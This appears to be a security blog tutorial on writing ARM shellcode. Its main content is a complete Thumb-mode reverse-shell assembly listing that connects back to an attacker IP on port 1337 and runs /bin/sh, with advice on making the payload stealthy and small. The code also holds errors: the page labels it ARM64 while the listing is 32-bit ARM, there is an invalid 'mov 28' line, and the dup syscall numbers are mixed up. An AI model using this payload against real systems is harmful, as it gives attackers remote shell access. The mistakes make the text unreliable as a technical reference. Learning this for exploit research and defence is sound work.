---
description: 04/25/2024
cover: >-
  https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/be599129-f70d-4023-85f7-da62d2619de9/ddtz9di-15e0c135-1e51-446f-b5cb-69f20422864f.jpg/v1/fill/w_1110,h_386,q_75,strp/two_magic_conch_shells_by_delightfuldiamond7_ddtz9di-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9Mzg2IiwicGF0aCI6IlwvZlwvYmU1OTkxMjktZjcwZC00MDIzLTg1ZjctZGE2MmQyNjE5ZGU5XC9kZHR6OWRpLTE1ZTBjMTM1LTFlNTEtNDQ2Zi1iNWNiLTY5ZjIwNDIyODY0Zi5qcGciLCJ3aWR0aCI6Ijw9MTExMCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.fBu5I18TeM2D2EtW9UEhEjGlA8Li3obgd7bEq0VZeRY
coverY: 39.96694214876033
layout:
  cover:
    visible: true
    size: full
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# üêö ARM Shellcode

## Introduction

As we remember, shellcode is a set of instructions that is introduced usually as a payload for a program and will be executed as a strategic instruction set that will carry out the attacker's motives.

In this blog, we will be learning about ARM64 Assemly and writing shellcode for that specific architecture. Since we are writing shellcode that usually comes with environmental constraints attached to our target, it is recommended to learn how to operate your Assembly in THUMB-mode, which is what we will also be introducing here!

Be sure to <mark style="color:yellow;">reference the ARM64 call table</mark> for syscall ID references and documentation.

{% embed url="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm64-64_bit" %}
Linux syscall table
{% endembed %}

## References

Seriously, take the time to check these out. No more than 5-10 mins of reading.&#x20;

{% embed url="https://systemweakness.com/in-the-mind-of-a-hacker-arm-reverse-shell-tcp-f169f2b791e6" %}
:bulb:
{% endembed %}

{% embed url="https://medium.com/syscall59/shellcode-for-iot-a-password-protected-reverse-shell-linux-arm-a18fcda4853b" %}
So insightful...
{% endembed %}

## Reverse Shells with Shellcode

Pay special attention to <mark style="color:green;">198</mark>, which is a socket syscall.&#x20;

<figure><img src="../../.gitbook/assets/image (1).png" alt="" width="375"><figcaption><p>Last meme I promise... maybe</p></figcaption></figure>

### Things to Keep in Mind

One special trick that I found out rather quickly while playing with ARM ASM is that we have lots of control of the size and amount of instructions that we can introduce to the system/program due to branching and modes.&#x20;

Often times when working on exploits and creating shellcode, the goal is to make it as stealthy and as small as possible so we can fit it within small buffer sizes. We can leverage one of ARM's many capabilities and go into [Thumb mode](https://hacking.swizsecurity.com/hacking\_methodology/programming/assembly/arm-aarch-64#arm-assembly).&#x20;

This essentially will:

* :thumbsdown: Trade off means we have fewer instructions and registries available&#x20;
* :thumbsup: Advantage is we are halving our instruction size from 32-bit (ARM-mode) to 16-bit (THUMB-mode)

This is very simple to accomplish. It takes place at the start of the program and will force our instructions and CPU to use THUMB-mode. This is done by branching our program\_counter+1 (`pc+1`).

This is our program counter register, the equivalent to the Instruction Pointer in x86\_64, this is a special-purpose register that holds the address of the next instruction to be executed by the CPU.

Building out your socket connection in ASM might seem a little daunting at first, but I'm here to tell you that you don't have to worry at all, I'm going to break this down for you as much as possible.&#x20;

### Socket Structure

1. Create a <mark style="color:yellow;">socket</mark> -> `mov w8,`` `<mark style="color:green;">`#198`</mark>
2. <mark style="color:yellow;">Connect</mark> to the <mark style="color:yellow;">socket</mark> -> `mov w8,`` `<mark style="color:green;">`#203`</mark> -- This will reference your <mark style="color:yellow;">struct</mark> that will hold important networking information such as the callback address&#x20;
3. duplicate3 (<mark style="color:yellow;">`dup3`</mark>) -- This will be split into three sections and is used for <mark style="color:yellow;">stdin</mark> (0), <mark style="color:yellow;">stdout</mark> (1), and <mark style="color:yellow;">stderr</mark> (2) for our socket's file descriptor (`sockfd`)
   1. You will be creating three of these sections using `dup3` in your code
   2. `dup3` utilizes syscall ID 24 -> `mov w8,`` `<mark style="color:green;">`#24`</mark>
4. Call <mark style="color:yellow;">`execve("/bin/sh")`</mark> -- This will execute the string `"/bin/sh"` and grant us a usable shell that our socket can access remotely -> `mov 28,`` `<mark style="color:green;">`#221`</mark>
5. <mark style="color:yellow;">Create</mark> your <mark style="color:yellow;">struct</mark>, this will hold your IP type (IPv4, IPv6, likely going to use AF\_INET), port number, and your IP address for the system to establish a remote connection back to
6. Specify your "<mark style="color:yellow;">/bin/sh</mark>" as a variable to keep things easily readable

{% hint style="info" %}
Keep on reading to see this in action and get added into our PoC!
{% endhint %}

`reverseshell.s`:

```nasm
.section .text
.global _start

_start:

.ARM
        add r3, pc, #1
        bx r3
        
.THUMB
        // Create socket -- socket(2, 1, 0)
        mov r0, #2
        mov r1, #1
        mov r7, #200
        add r7, #81
        svc #1
        push {r0, r1, r2} // This will store values r0=3, r1=1, r2=0
        
        // Connect to newly created socket connect(r0, &sockaddr, 16)
        adr r1, sockaddr
        strb r2, [r1, #1]
        mov r2, #16
        add r7, #2
        svc #1
        
        // dup2:
        // dup(3,2)
        pop {r0, r1, r2} // Restore valeus
        mov r7, #63
        
        // dup2(3,1)
        svc #1
        
        // dup2(3,0)
        sub r1, #1
        svc #1
        
        // execve -- shell time!
        adr r0, shell
        mov r1, #0
        mov r2, #0
        mov r7, #221
        svc #1
        
shell:
        .ascii "/bin/sh?"
        sockaddr:
                .ascii "\x02\xff"
                .ascii "\x05\x39" // Port 1337
                .byte 192,168,1,x // IP address for attacker machine here
        
```

{% hint style="info" %}
I also recently learned that if you're really trying to save space but you're trying to land a shell in your shellcode, you can even get rid of `stderr` (`r0=3`) and your program will work fine without it. :bulb:
{% endhint %}
